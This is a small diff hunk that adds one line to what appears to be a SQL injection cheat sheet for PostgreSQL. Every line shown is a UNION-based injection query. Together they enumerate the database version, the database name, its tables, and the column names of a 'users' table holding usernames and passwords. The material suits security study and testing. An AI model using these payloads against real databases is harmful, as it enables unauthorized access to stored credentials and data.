@@ -129,6 +129,7 @@ SELECT CAST((SELECT table_name FROM information_schema.tables
 SELECT username, password FROM users WHERE username='' UNION SELECT NULL, version();
 SELECT username, password FROM users WHERE username='' UNION SELECT NULL, current_database();
 SELECT username, password FROM users WHERE username='' UNION SELECT NULL, table_name FROM information_schema.tables;
+SELECT username, password FROM users WHERE username='' UNION SELECT NULL, column_name FROM information_schema.columns where table_name='users';
 SELECT username, password FROM users WHERE username='' UNION SELECT NULL, string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public';
 ```
 
